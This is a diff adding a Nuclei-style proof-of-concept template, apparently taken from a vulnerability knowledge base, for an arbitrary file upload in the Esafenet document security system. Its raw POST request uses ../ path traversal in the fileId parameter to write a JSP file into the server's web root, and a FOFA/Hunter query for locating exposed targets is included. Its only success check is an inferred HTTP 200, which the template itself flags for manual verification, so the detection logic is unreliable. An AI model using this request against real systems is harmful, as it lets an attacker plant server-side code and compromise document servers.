@@ -1,0 +1,46 @@
+id: poc-9943aff0d41607a393e9
+info:
+  name: 亿赛通电子文档安全管理系统DecryptApplicationService2接口任意文件上传
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/9943aff0d41607a393e959eda5c8bed3
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: file-upload,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 9943aff0d41607a393e959eda5c8bed3
+    fofa: + hunter`app.name="ESAFENET 亿赛通文档安全管理系统"`
+http:
+- raw:
+  - 'POST /CDGServer3/DecryptApplicationService2?fileId=../../../Program+Files+(x86)/ESAFENET/CDocGuard+Server/tomcat64/webapps/CDGServer3/pentest.jsp HTTP/1.1
+
+    User-Agent: Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36
+
+    Accept-Encoding: gzip, deflate
+
+    Accept: */*
+
+    Connection: close
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Cookie: JSESSIONID=B9964151074C71F115A9C803FFF05C34
+
+    Upgrade-Insecure-Requests: 1
+
+    Content-Length: 11
+
+
+    pentest'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
